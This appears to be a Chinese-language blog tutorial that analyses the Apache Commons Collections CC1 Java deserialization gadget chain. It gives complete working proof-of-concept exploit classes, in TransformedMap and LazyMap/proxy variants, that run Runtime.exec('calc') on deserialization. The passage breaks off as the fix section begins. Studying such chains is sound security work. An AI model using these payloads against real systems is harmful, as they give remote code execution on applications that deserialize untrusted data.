---
title: CC1
date: 2025-08-30T15:00:00+08:00
tags:
  - "java 学习"
  - "CC链"
categories:
  - "Java"
description: Java 反序列化学习 - CC1链
showToc: true
draft: false
tocOpen: true
---
# 环境
## 1、JDK-8u65	
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html?utm_source=chatgpt.com)

**注意：国家不要选为国区，国区对应的 8u65 下载的时候会自动下载 8u111 等高版本！**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805704.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805734.png)

## 2、Maven-commons-collections 3.2.1


[https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1)



```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.2.1</version>
</dependency>
```



## 3、修改 sun 包-方便调试
[https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805174.png)

将 jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes\sun

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805660.png)

放入：jdk1.8.0_65\src

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805980.png)

<font style="color:rgb(102, 102, 102);">把 src 文件夹添加到源路径下</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805831.png)

# Apache Commons Collections包和简介:
[https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/](https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/)

# CC1链分析：
首先要明白，CC1 链的源头是 Commons Collections 库中的 Tranformer （ org/apache/commons/collections/Transformer.java ）接口中的 transform 方法，这个接口的设计初衷，是为了把一个对象转换成另一个对象， 但是，在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。

这样的类有以下几种：

**最核心、最危险的类**：

+ `InvokerTransformer` （执行任意方法，命令执行）
+ `InstantiateTransformer` （实例化任意类，构造函数触发危险逻辑）

 **组合辅助类（触发链条的关键）**：

+ `ChainedTransformer`（组合执行器）
+ `LazyMap`（触发入口）



## 1、 TransformedMap 版  
> **《Java 安全漫谈》**
>
> **TransformedMap的出处**
>
> 既然ysoserial中没有用到TransformedMap，那么TransformedMap究竟是谁最先提出来的呢？
>
> 据我的考证，最早讲到TransformedMap应该是Code White的这篇Slide：Exploiting
>
> Deserialization Vulnerabilities in Java([https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478](https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478))1	，后来长亭科技的博客文章《Lib之过？Java反序列化漏洞通用利用分析》（[https://www.anquanke.com/post/id/82898](https://www.anquanke.com/post/id/82898) 原文网站进不去了，只有转载）对此进行了进一步分析，后来才在国内众多文章中被讲到。
>

### 1.1 漏洞利用
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805576.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806717.png)

```java
public class InvokerTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = -8653385846894047688L;

    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

    public static Transformer getInstance(String methodName) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be null");
        }
        return new InvokerTransformer(methodName);
    }

    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be null");
        }
        if (((paramTypes == null) && (args != null))
            || ((paramTypes != null) && (args == null))
            || ((paramTypes != null) && (args != null) && (paramTypes.length != args.length))) {
            throw new IllegalArgumentException("The parameter types must match the arguments");
        }
        if (paramTypes == null || paramTypes.length == 0) {
            return new InvokerTransformer(methodName);
        } else {
            paramTypes = (Class[]) paramTypes.clone();
            args = (Object[]) args.clone();
            return new InvokerTransformer(methodName, paramTypes, args);
        }
    }

 
    private InvokerTransformer(String methodName) {
        super();
        iMethodName = methodName;
        iParamTypes = null;
        iArgs = null;
    }

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    //实现 Transformer 接口，重写的transform方法，把传入的对象 input 转换成另一个对象
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            //获取传入对象的运行时类
            Class cls = input.getClass();
            //从 cls 类中，反射获取一个方法对象；iMethodName：构造 InvokerTransformer 时传入的目标方法名（可控）；iParamTypes：方法的参数类型数组（可控）
            Method method = cls.getMethod(iMethodName, iParamTypes);
            //调用上一步拿到的 method，并传入参数 iArgs（可控）
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

}
```





从源码中可知存在反射调用任意类，并且各个参数都是可控的，使用反射调用 Runtime.exec ：

```java
Runtime r = Runtime.getRuntime();
//方法名为exec，参数类型为String，参数值为calc
InvokerTransformer invokerTransformer = new InvokerTransformer(
    "exec",
    new Class[]{String.class},
    new Object[]{"calc"}
);
invokerTransformer.transform(r);
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806892.png)



### 1.2 分析漏洞链
现在我们知道了`InvokerTransformer.transform()` 方法能执行任意命令，但是它自己不会平白无故被调用，必须有别的类/方法调用它， 我们就去找哪些类会在正常逻辑中调用 `transform`**。**如果有哪个类调用了 `transform`， 就等于找到了一个“入口点”，只要我们能控制传进去的 Transformer，就能让应用在“正常使用 Map”的时候，自动调用到我们的恶意 `transform` ，从而执行命令 。



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806070.png)

在 `TransformedMap`类中找到 `checkSetValue()`方法调用了 `transform()`方法

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806968.png)



```java
public class TransformedMap
    extends AbstractInputCheckedMapDecorator
    implements Serializable {

    /** Serialization version */
    private static final long serialVersionUID = 7023152376788900464L;

    /** The transformer to use for the key */
    protected final Transformer keyTransformer;
    /** The transformer to use for the value */
    //若把 valueTransformer 设为 InvokerTransformer，当它被调用 transform() 时就能执行任意方法/命令
    protected final Transformer valueTransformer;

    //decorate(装饰)，把一个已经存在的 Map 包一层 TransformedMap,以后对这个 Map 做的操作（比如 put），就会先经过 Transformer 处理，再真正存进去
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }

    //另一种装饰，decorate：包装，不改已有数据；decorateTransform：先改旧数据再包装
    public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        TransformedMap decorated = new TransformedMap(map, keyTransformer, valueTransformer);
        if (map.size() > 0) {
            Map transformed = decorated.transformMap(map);
            decorated.clear();
            decorated.getMap().putAll(transformed);  // avoids double transformation
        }
        return decorated;
    }

    //保存底层 map 和两个 transformer;valueTransformer 是我们需要的关键点
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }

    //自定义序列化，这里的 readObject 并不会主动触发 transformer；它只是把结构恢复
    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject(map);
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        map = (Map) in.readObject();
    }

    //若有 keyTransformer 则对 key 做变换；这里的“变换”，在正常情况下是对 key/value 做某种转换（如：大小写转换），但在漏洞利用时，“变换”就执行了攻击者的代码
    protected Object transformKey(Object object) {
        if (keyTransformer == null) {
            return object;
        }
        return keyTransformer.transform(object);
    }

    protected Object transformValue(Object object) {
        if (valueTransformer == null) {
            return object;
        }
        return valueTransformer.transform(object);
    }

    protected Map transformMap(Map map) {
        if (map.isEmpty()) {
            return map;
        }
        Map result = new LinkedMap(map.size());
        for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) {
            Map.Entry entry = (Map.Entry) it.next();
            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));
        }
        return result;
    }

    //这里直接调用了 valueTransformer.transform(value)
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }

    protected boolean isSetValueChecking() {
        return (valueTransformer != null);
    }

    //-----------------------------------------------------------------------
    public Object put(Object key, Object value) {
        key = transformKey(key);
        value = transformValue(value);
        return getMap().put(key, value);
    }

    public void putAll(Map mapToCopy) {
        mapToCopy = transformMap(mapToCopy);
        getMap().putAll(mapToCopy);
    }

}
```

 因为构造函数是 protected，我们不能直接实例化传参，所以找到一个**公共方法 decorate** ，外部调用它就能 new 出一个 TransformedMap 实例， 创建出一个 TransformedMap 对象，并把自己的 Transformer 塞进去，然后通过调用  checkSetValue() 触发 Transformer 。



```java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap<>(); 
//用 decorate 包装这个 map
//第二个参数 null ：不对 key 做变换
//第三个参数 invokerTransformer ：对 value 做变换（关键）
Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, invokerTransformer); 

```



接下来找谁调用了 checkSetValue() 

**在 AbstractInputCheckedMapDecorator.****<font style="color:#080808;background-color:#ffffff;">MapEntry.setValue() 调用了 checkSetValue() 方法</font>**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806376.png)

```java
    /**
     * Implementation of a map entry that checks additions via setValue.
     */
    //定义了一个静态内部类 MapEntry，它继承自 AbstractMapEntryDecorator
    static class MapEntry extends AbstractMapEntryDecorator {

        /** The parent map */
        //声明了一个不可变（final）字段 parent，类型是 AbstractInputCheckedMapDecorator
        private final AbstractInputCheckedMapDecorator parent;

        //构造器接收两个参数
        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }

        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }
}
```

+ `MapEntry` 是一个**包装器**，把原始 `Map.Entry` 包起来，目的就是在 `setValue(...)` 时插入一次 “由 parent 执行的检查/变换”（即调用 `parent.checkSetValue(...)`）。
+ 也就是说：任何通过这个包装的 `Entry` 调用 `setValue` 的操作，都会先经由 parent 的 `checkSetValue`，再回到底层 `entry`。

**当执行 entry.setValue(value) 时，他先调用 checkSetValue(value)，而 checkSetValue(value) 直接调用了  transform 。**



```java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap<>(); 
map.put("gxngxngxn","gxngxngxn"); //给map一个键值对，方便遍历
//用 decorate 包装这个 map；第二个参数 null ：不对 key 做变换；第三个参数 invokerTransformer ：对 value 做变换（关键）
Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, invokerTransformer); 
 for(Map.Entry entry:transformedmap.entrySet()) {
         //调用 entry.setValue(r)，这里传入的是 Runtime r 对象
         //但是在 MapEntry.setValue 里，会先执行parent.checkSetValue()
         //checkSetValue(value) 内部会执行 return valueTransformer.transform(value);
         //所以传进来的 r 会被 invokerTransformer.transform(r) 处理
         entry.setValue(r);                       
    }
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806162.png)

通过上述测试，说明这条链是能打通的，触发条件是手动遍历了 `transformedmap`，这不是真正的利用链，接下来要去找 readObject 来触发漏洞。

同样的，查找哪个方法调用了 setValue ，最好是重写的 readObject 。



在 AnnotationInvocationHandler 类的 <font style="color:#080808;background-color:#ffffff;">readObject 方法里调用了 setValue 方法</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807086.png)

```java
private void readObject(java.io.ObjectInputStream s)
throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    //获取注解里每个成员的类型（方法名：返回类型）
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            //检查当前值是否与成员类型匹配，或者是不是 ExceptionProxy
            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
                //如果不匹配，就调用：memberValue.setValue
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
            }
        }
    }
}
```

memberValues 也是可控的

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807528.png)



### 1.3 构造 POC & 遇到的问题：
初步构造：

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws Exception{

        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Override.class, transformedMap);

        // 序列化反序列化
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

但目前还不能成功利用，有三个问题需解决：

1. `Runtime` 对象不可序列化，需要通过反射将其变成可以序列化的形式

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807517.png)

反射解决：

先写普通反射：

```java
Class c = Runtime.class;  
Method method = c.getMethod("getRuntime");  
Runtime runtime = (Runtime) method.invoke(null, null);  
Method run = c.getMethod("exec", String.class);  
run.invoke(runtime, "calc"); 
```

然后改为 `InvokerTransformer` 调用：

```java
Class c = Runtime.class;
        Method m = (Method) new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}
        ).transform(Runtime.class);

        Runtime r = (Runtime) new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}
        ).transform(m);

        new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        ).transform(r);
```

由于一个一个调用 transform 太繁琐，我们使用 ChainedTransformer 类进行简化：

`ChainedTransformer` 类下的 `transform` 方法递归调用了前一个方法的结果，作为后一个方法的参数

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807331.png)

```java
public class CC1Test {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);

        HashMap map = new HashMap();
        map.put("key", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);


        Class<Runtime> runtimeClass = Runtime.class;
        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Override.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

这样就解决了第一个问题。

2. `AnnotationInvocationHandler`类中的判断条件

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png)

通过调试发现，<font style="color:#080808;background-color:#ffffff;">memberType = null 所以不进入 if 判断，无法调用 setValue</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png)

<font style="color:#080808;background-color:#ffffff;">memberType 是获取注解中成员变量的名称</font>，然后并且检查键值对中键名是否有对应的名称，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807650.png)

点进 <font style="color:#080808;background-color:#ffffff;">Override，我们所使用的注解是没有成员变量的</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807700.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011720823.png)

而点进 <font style="color:#080808;background-color:#ffffff;">Target 发现其符合我们的需求</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807151.png)



修改POC：

```java
HashMap<Object, Object> hashMap = new HashMap<>();

        //修改参数
        hashMap.put("value","value");

        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);
        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        //改传参注解为：Target
        Object o = constructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");
```

这时 <font style="color:#080808;background-color:#ffffff;">memberType 已经不为空了。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808790.png)



3. `setValue` 传参固定

继续跟进时，发现`setValue` 传入的值不是 Runtime.class ，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808526.png)

这里就需要 `ConstantTransformer` 类，`ConstantTransformer` 方法将传入的对象放入 `iConstant`中，`transform()` 方法无论传入什么，都返回 `iConstant`，完美符合要求。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808248.png)



修改POC：

```java
public class CC1Test {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                //添加：
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```



### 1.4 最终 POC ：
```java
public class CC1Test {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class<?> c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c1.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808016.png)



### 1.5 总结
`transform` 方法，可以把一个对象转换成另一个对象， 但是，在实现类里把 `transform` 变成“可以执行任意逻辑”时，就出现了漏洞。我们发现 `InvokerTransformer` 实现了 `Transformer` 接口并且有 `transform` 方法，

接着找到 `TransformedMap` 类中的 `checkSetValue` 方法调用了 `transform` 方法；

之后找到 `AbstractInputCheckedMapDecorator` 类中的 `setValue` 方法调用了 `checkSetValue`方法，

通过测试这条链是没问题的，那么接下来的目标就是寻找一个入口点 ，查找哪个方法调用了 `setValue` ，最好是重写的 `readObject`，通过 `readObject` 来触发漏洞。

找到 `AnnotationInvocationHandler` 类中的 `readObject` 方法存在 `setValue`，需要注意的是 `readObject` 不是直接调用 ·，

`readObject` 方法在反序列化时，会从序列化数据中恢复 `memberValues`（一个 `Map`），而这个 `Map` 的内容完全取决于攻击者传入的序列化流。攻击者可以在这里替换成 `TransformedMap`，从而把恶意 `Transformer` 链接进来。

通过对 `readObject` 的调试，知道了 `readObject` 如何触发 `setValue` ：

在反序列化时，`AnnotationInvocationHandler.readObject` 会去恢复 `memberValues` 里的数据。它遍历 `memberValues.entrySet()` 时，取到的 `MapEntry` 会调用 `setValue` 来写入值。也就是说：反序列化时，`readObject` 间接触发了 `MapEntry.setValue`。 



**完整的利用链思路：**

 AnnotationInvocationHandler.readObject

memberValue.setValue

MapEntry.setValue

parent.checkSetValue

TransformedMap.checkSetValue

valueTransform.transform

ChainedTransformer.transform

ConstantTransformer.transform

InvokerTransformer.transform  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808194.png)

`readObject` 在反序列化时会恢复 `memberValues`（一个 `Map`）,

由于攻击者可控，这个 `Map` 可以被替换为 `TransformedMap`，

当 `readObject` 遍历 `memberValues.entrySet()` 时，会触发 `MapEntry.setValue`，

`setValue` 会调用 `checkSetValue`，而 `checkSetValue` 又会调用 `valueTransform.transform`，

这里的 `valueTransform` 实际上是 `ChainedTransformer`，它会依次执行其中的 `ConstantTransformer` 和 `InvokerTransformer`，

最终 `InvokerTransformer.transform` 会调用任意方法，从而实现代码执行。

## 2、 LazyMap 版  
### 2.1 分析利用链
首先找到 LazyMap 类中的 get 方法中有 <font style="color:#080808;background-color:#ffffff;">transform 方法。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808665.png)

找 factory ：<font style="color:#080808;background-color:#ffffff;">Transformer</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808064.png)

由于此处的构造方法同样为 protected ，还是利用静态方法 decorate 传参

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808653.png)

继续找谁调用了 LayMap.get() 

在 <font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler 类中的 invoke 方法调用了 get</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808079.png)

同时这个类也有 TransformedMap 中用到的 readObject 方法 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311809084.png)

<font style="color:rgb(44, 62, 80);">要触发 AnnotationInvocationHander.invoke，用到动态代理</font>

### 2.2 编写 EXP 
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Test02 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);

        HashMap map = new HashMap();
        //首先用 LazyMap 替换 TransformedMap
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        //对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行 Proxy
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        //利用反射创建了一个 AnnotationInvocationHandler 对象；它内部的 memberValues 是 LazyMap
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        //创建动态代理对象 proxyMap，当有人对这个 proxyMap 调用 Map 的任意方法，会进入 AnnotationInvocationHandler.invoke(...)
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        //因为 proxyMap 自己序列化 /反序列化不会触发链子；只有 AnnotationInvocationHandler 的反序列化过程才会去主动访问 memberValues
        //把 proxyMap 塞进一个新的 AnnotationInvocationHandler 的 memberValues 字段里，让它在 readObject() 时被调用
        Object o = constructor.newInstance(Retention.class, proxyMap);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810087.png)



### 2.3 问题
1. 未执行到 readObject 就弹出计算器

> 《Java 安全漫谈》
>
> 在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所
>
> 以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了
>
> 命令。
>

解决办法有 ：

设置 - 构建、执行、部署 - 调试器 - 数据视图 - Java

关闭：

启用集合类的替代视图

启用'toStringO’对象视图

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810304.png)



### 2.4 总结
漏洞原理：

+ `LazyMap.decorate(Map, Transformer)` 包装一个底层 Map。
+ 当调用 `get(key)` 时，如果 `key` 不存在，就会调用 `transformer.transform(key)` 生成值并返回

利用链：

AnnotationInvocationHandler.readObject

AnnotationInvocationHandler.invoke

memberValues.get

LazyMap.get

LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font>

ChainedTransformer.transform

ConstantTransformer.transform

InvokerTransformer.transform  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810272.png)



# 漏洞修复：
## 1、TransformedMap
TransformedMap 在 Java 8u71 以上的版本就不可以使用了。

首先梳理一下 TransformedMap 利用链的逻辑：

